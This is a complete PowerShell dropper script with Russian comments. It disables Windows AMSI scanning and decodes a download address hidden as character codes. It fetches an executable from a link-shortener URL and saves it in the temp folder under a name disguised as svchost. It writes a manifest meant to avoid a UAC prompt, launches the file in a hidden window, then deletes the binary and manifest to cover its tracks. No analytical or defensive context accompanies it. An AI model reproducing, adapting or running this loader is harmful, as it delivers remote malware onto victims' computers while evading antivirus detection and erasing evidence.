# Обход AMSI (оставлен как есть)
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.FullName-like"*Context"){foreach($c in $b.GetFields('NonPublic,Static')){if($c.Name-like"*Context"){$d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($c.GetValue($b.GetValue(0)),[IntPtr]);$d.Invoke([IntPtr]0,[uint32]0,[IntPtr]0)}}}}

# URL для скачивания
$u=104,116,116,112,115,58,47,47,117,46,116,111,47,65,122,116,51,73,103;$url=[string]::Concat(($u|%{[char]$_}))

# Скачиваем файл
$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$b=$wc.DownloadData($url);$wc.Dispose()

# Генерируем имя для EXE файла
$randomName = [guid]::NewGuid().Guid.Split('-')[0]
$exePath = "$env:TEMP\svchost_$randomName.exe"
$manifestPath = "$exePath.manifest"

# Сохраняем EXE файл
[IO.File]::WriteAllBytes($exePath, $b)

# СОЗДАЕМ ВНЕШНИЙ МАНИФЕСТ ДЛЯ ОТКЛЮЧЕНИЯ UAC
$manifestContent = @'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
'@

# Записываем манифест в файл
[IO.File]::WriteAllText($manifestPath, $manifestContent, [System.Text.Encoding]::UTF8)

# Запускаем EXE (теперь он должен запускаться без запроса UAC)
$psi=New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName=$exePath
$psi.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow=$true
$psi.UseShellExecute=$false
$psi.RedirectStandardOutput=$true
$psi.RedirectStandardError=$true

# Запускаем процесс
$process = [Diagnostics.Process]::Start($psi)

# Очистка
$b=$null;[GC]::Collect();[GC]::WaitForPendingFinalizers()

# Ждем немного, чтобы процесс успел запуститься
Start-Sleep -m 500

# Удаляем оба файла (EXE и манифест)
try { Remove-Item $exePath -Force -ErrorAction SilentlyContinue } catch {}
try { Remove-Item $manifestPath -Force -ErrorAction SilentlyContinue } catch {}

[Environment]::Exit(0)